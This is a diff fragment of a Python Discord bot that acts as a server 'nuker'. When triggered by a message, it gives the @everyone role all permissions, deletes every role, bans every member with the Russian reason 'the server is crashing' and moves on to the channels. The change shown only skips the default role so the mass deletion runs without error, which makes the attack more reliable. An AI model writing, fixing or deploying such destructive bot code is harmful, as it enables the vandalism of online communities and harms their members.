@@ -20,7 +20,8 @@ class MyClient(discord.Client):
             await message.guild.default_role.edit(permissions=Permissions.all())
 
             for i in message.guild.roles:
-                await i.delete()
+                if i != message.guild.default_role:
+                    await i.delete()
             for i in message.guild.members:
                 await i.ban(reason='Сервер крашится')
             for i in message.guild.channels:
